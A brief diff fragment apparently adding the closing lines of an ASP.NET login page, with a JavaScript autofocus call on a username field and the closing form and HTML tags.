+    else {
+        return true;
+    }
+}
+        WebForm_AutoFocus('ctl00_MainHolder_UserName');//]]>
+</script>
+</form>
+
+
+</body></html>
